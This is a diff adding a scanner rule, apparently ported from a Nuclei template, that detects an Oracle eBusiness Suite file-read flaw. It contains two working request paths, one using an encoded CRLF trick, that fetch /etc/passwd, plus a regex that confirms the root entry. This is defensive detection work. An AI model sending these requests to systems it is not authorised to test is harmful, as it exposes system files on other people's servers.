@@ -1,0 +1,31 @@
+schema_version: 1
+id: "cortex.community:oracle-ebs-bispgrapgh-file-read"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "Oracle eBusiness Suite - Improper File Access"
+  description: "Oracle eBusiness Suite is susceptible to improper file access vulnerabilities via bispgrapgh. Be aware this product is no longer supported with patches or security fixes. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite-wp-4.pdf"
+    - "http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf"
+  tags: ["oracle", "lfi", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "Critical"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/" }
+  - id: "probe1"
+    request: { method: "GET", path: "/OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    any:
+      - regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:.*:0:0:" } }
+      - regex: { left: { ref: "steps.probe1.body" }, right: { value: "root:.*:0:0:" } }
